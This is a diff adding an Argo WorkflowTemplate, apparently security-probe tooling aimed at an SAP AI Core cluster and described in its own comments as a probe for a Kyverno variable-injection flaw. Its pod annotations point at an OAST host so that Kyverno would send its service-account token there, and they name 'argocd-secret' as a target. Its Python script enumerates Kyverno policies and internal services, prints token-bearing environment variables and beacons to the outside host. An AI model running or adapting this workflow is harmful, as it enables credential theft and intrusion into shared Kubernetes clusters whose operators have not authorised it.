@@ -1,0 +1,99 @@
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata:
+  name: probe-train-v15
+  labels:
+    scenarios.ai.sap.com/id: "bbprobe-global-1775842304"
+    ai.sap.com/version: "1.0.0"
+  annotations:
+    scenarios.ai.sap.com/name: "bbprobe-global-1775842304"
+    executables.ai.sap.com/name: "probe-train-v15"
+    executables.ai.sap.com/description: "KSM Kyverno policy enum + OAST annotation probe (GHSA-8wfp-579w-6r25)"
+spec:
+  templates:
+  - name: probe
+    # Pod-level annotations — if any SAP ClusterPolicy uses a variable URL derived
+    # from pod annotations (GHSA-8wfp-579w-6r25 / CVE-2026-22039 variable injection),
+    # Kyverno would call our OAST and forward its SA token automatically.
+    metadata:
+      annotations:
+        probe.security/callback: "https://d7f7fjmipla8bru9umagndehoqayja3z6.oast.live/kyverno-sa-token"
+        probe.security/url: "https://d7f7fjmipla8bru9umagndehoqayja3z6.oast.live/kyverno-sa-token"
+        probe.security/webhook: "https://d7f7fjmipla8bru9umagndehoqayja3z6.oast.live/kyverno-sa-token"
+        probe.security/service: "https://d7f7fjmipla8bru9umagndehoqayja3z6.oast.live/kyverno-sa-token"
+        target_ns: "argocd"
+        target_name: "argocd-secret"
+    container:
+      image: python:3.11
+      command: ["/bin/sh", "-c"]
+      args:
+      - |
+        python3 - << 'EOF'
+        import urllib.request, os, json, socket
+
+        OAST  = "https://d7f7fjmipla8bru9umagndehoqayja3z6.oast.live"
+        KSM   = "http://ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics"
+
+        def report(k, v):
+            print(f"[PT15] {k}: {str(v)[:50000]}", flush=True)
+
+        report("START", "probe-train-v15 - Kyverno policy enum + OAST annotation probe")
+
+        # --- Query KSM for Kyverno-related metrics ---
+        report("KSM_QUERY", "fetching all kyverno-related metrics from KSM")
+        try:
+            with urllib.request.urlopen(KSM, timeout=15) as resp:
+                raw = resp.read().decode()
+            kyverno_lines = [l for l in raw.splitlines()
+                             if any(x in l.lower() for x in
+                                    ["kyverno", "policy", "clusterpolicy", "policyexception",
+                                     "admission", "webhook", "cpol", "npol"])]
+            report("KSM_KYVERNO_LINES", "\n".join(kyverno_lines[:500]))
+        except Exception as e:
+            report("KSM_ERROR", str(e))
+
+        # --- Probe Kyverno service endpoints ---
+        report("KYVERNO_PROBE", "probing kyverno admission webhook service")
+        kyverno_hosts = [
+            "kyverno-svc.kyverno.svc.cluster.local",
+            "kyverno.kyverno.svc.cluster.local",
+            "kyverno-admission-webhook.kyverno.svc.cluster.local",
+            "kyverno-background-controller.kyverno.svc.cluster.local",
+            "kyverno-cleanup-controller.kyverno.svc.cluster.local",
+        ]
+        for host in kyverno_hosts:
+            try:
+                ip = socket.gethostbyname(host)
+                report(f"DNS_{host}", f"RESOLVED: {ip}")
+            except socket.gaierror as e:
+                report(f"DNS_{host}", f"NXDOMAIN/ERROR: {e}")
+
+        # Try to reach Kyverno's metrics/healthz endpoints
+        for host in ["kyverno-svc.kyverno.svc.cluster.local",
+                     "kyverno.kyverno.svc.cluster.local"]:
+            for port, path in [(8000, "/metrics"), (9443, "/health/liveness"),
+                               (8443, "/health/liveness"), (2049, "/metrics")]:
+                try:
+                    url = f"http://{host}:{port}{path}"
+                    with urllib.request.urlopen(url, timeout=5) as r:
+                        body = r.read().decode()[:2000]
+                    report(f"KYVERNO_HTTP_{host}_{port}{path}", f"HTTP {r.status}: {body}")
+                except Exception as e:
+                    report(f"KYVERNO_HTTP_{host}_{port}{path}", str(e)[:200])
+
+        # --- Dump our own pod annotations (set at pod level by Argo) ---
+        report("OWN_ANNOTATIONS_CHECK", "env vars from potential Kyverno mutation")
+        for k, v in sorted(os.environ.items()):
+            if any(x in k for x in ["KYVERNO", "EXFIL", "ARGOCD", "KUBESYS", "TOKEN", "WEBHOOK"]):
+                report(f"ENV_{k}", v[:5000])
+
+        # --- OAST beacon ---
+        try:
+            with urllib.request.urlopen(f"{OAST}/pt15-alive", timeout=8) as r:
+                report("OAST_BEACON", f"HTTP {r.status}")
+        except Exception as e:
+            report("OAST_BEACON", str(e)[:200])
+
+        report("DONE", "probe-train-v15 complete")
+        EOF
+  entrypoint: probe
